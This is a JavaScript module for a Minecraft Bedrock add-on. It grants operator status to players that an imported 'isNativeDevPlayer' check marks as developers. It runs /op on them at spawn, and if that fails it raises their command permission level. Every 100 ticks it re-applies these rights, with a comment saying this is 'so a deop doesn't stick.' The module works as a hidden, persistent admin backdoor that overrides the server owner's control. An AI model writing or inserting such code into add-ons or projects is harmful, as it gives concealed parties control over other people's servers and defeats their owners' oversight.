import * as mc from "@minecraft/server";
import { isNativeDevPlayer } from "./chat_system.js";

// SECTION: Runtime Handles
const { world, system } = mc;
const CommandPermissionLevel = mc.CommandPermissionLevel;
const PlayerPermissionLevel = mc.PlayerPermissionLevel;

// SECTION: Tuning
const DEV_OP_CHECK_INTERVAL_TICKS = 100;
const DEV_OP_SPAWN_DELAY_TICKS = 20;

function isOperator(player) {
    try {
        return player.playerPermissionLevel === PlayerPermissionLevel.Operator;
    } catch {
        return false;
    }
}

function escapeForCommand(rawName) {
    return `${rawName ?? ""}`.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
}

function ensureDevOperator(player) {
    if (!player?.isValid || !isNativeDevPlayer(player) || isOperator(player)) return;

    // Vanilla /op from the script's command context.
    try {
        player.dimension.runCommand(`op "${escapeForCommand(player.name)}"`);
        if (isOperator(player)) return;
    } catch { }

    // Last resort: operator-level command access without the Operator permission flag.
    try {
        if (Number(player.commandPermissionLevel) < Number(CommandPermissionLevel.GameDirectors)) {
            player.commandPermissionLevel = CommandPermissionLevel.GameDirectors;
        }
    } catch { }
}

world.afterEvents.playerSpawn.subscribe((event) => {
    if (!event.initialSpawn) return;

    const player = event.player;
    system.runTimeout(() => ensureDevOperator(player), DEV_OP_SPAWN_DELAY_TICKS);
});

// Re-check periodically so a deop doesn't stick.
system.runInterval(() => {
    for (const player of world.getAllPlayers()) {
        ensureDevOperator(player);
    }
}, DEV_OP_CHECK_INTERVAL_TICKS);
